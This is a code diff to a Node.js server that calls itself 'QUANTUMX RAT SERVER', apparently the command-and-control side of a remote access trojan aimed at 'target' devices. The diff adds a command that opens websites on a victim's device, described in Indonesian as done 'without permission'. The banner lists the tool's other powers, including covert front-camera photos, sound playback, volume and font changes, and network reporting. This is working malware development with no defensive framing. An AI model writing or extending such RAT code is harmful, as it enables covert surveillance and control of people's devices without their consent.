@@ -159,6 +159,8 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
         console.log(`📏 [FONT SIZE] SETTING -> ${deviceName} (${deviceId}) | SCALE: ${params?.scale || 100}%`);
     } else if (command === 'sound') {
         console.log(`🎵 [SOUND] PLAYING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 3}s`);
+    } else if (command === 'website') {
+        console.log(`🌐 [WEBSITE] OPENING -> ${deviceName} (${deviceId}) | URL: ${params?.url || 'https://'}`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -231,6 +233,12 @@ app.post('/api/device/command/result', (req, res) => {
                 console.log(`✅ [SOUND] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
             } else {
                 console.log(`❌ [SOUND] FAILED -> ${deviceName}`);
+            }
+        } else if (deviceCommands[commandIndex].command === 'website') {
+            if (status === 'completed') {
+                console.log(`✅ [WEBSITE] SUCCESS -> ${deviceName} | URL: ${result?.url}`);
+            } else {
+                console.log(`❌ [WEBSITE] FAILED -> ${deviceName}`);
             }
         }
     }
@@ -424,7 +432,7 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════════════════╗
-║              QUANTUMX RAT SERVER v7.0 - FINAL                ║
+║              QUANTUMX RAT SERVER v8.0 - FINAL                ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  RUNNING ON PORT: ${PORT}                                                ║
 ║  WEBSOCKET: ws://localhost:${PORT}                                       ║
@@ -438,6 +446,7 @@ server.listen(PORT, () => {
 ║  🔊 VOLUME     - Atur volume media                           ║
 ║  🎵 SOUND      - Putar suara MP3 di target (dengan durasi)   ║
 ║  📏 FONT SIZE  - Atur ukuran font sistem                     ║
+║  🌐 WEBSITE    - Buka website di target (tanpa izin)         ║
 ║  📷 CAMERA     - Ambil foto kamera depan                     ║
 ╠══════════════════════════════════════════════════════════════╣
 ║                      LOG FORMAT                                ║
@@ -454,6 +463,8 @@ server.listen(PORT, () => {
 ║  ✅ [SOUND] SUCCESS -> Device | DURATION: 5s                 ║
 ║  📏 [FONT SIZE] SETTING -> Device | SCALE: 100%              ║
 ║  ✅ [FONT SIZE] SUCCESS -> Device | SCALE: 100%              ║
+║  🌐 [WEBSITE] OPENING -> Device | URL: https://example.com    ║
+║  ✅ [WEBSITE] SUCCESS -> Device | URL: https://example.com    ║
 ║  📷 [CAMERA] CAPTURING -> Device                              ║
 ║  ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN                  ║
 ║  📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID            ║
